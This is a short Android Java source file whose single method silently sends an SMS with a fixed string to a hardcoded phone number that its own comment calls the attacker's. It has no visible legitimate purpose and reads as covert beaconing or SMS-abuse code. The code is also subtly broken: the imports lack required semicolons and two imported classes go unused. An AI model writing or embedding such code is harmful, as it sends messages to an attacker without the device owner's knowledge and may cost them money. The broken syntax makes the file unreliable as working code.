import android.content.Context
import android.content.Intent
import android.net.Uri
import android.telephony.SmsManager

public class SendMessage {

    private Context context;

    public SendMessage(Context context) {
        this.context = context;
    }

    public void sendMessage() {
        // Get the phone number of the attacker
        String attackerPhoneNumber = "0650139138";

        // Get the message to send
        String message = "knbghik bzff";

        // Send the message
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(attackerPhoneNumber, null, message, null, null);
    }
}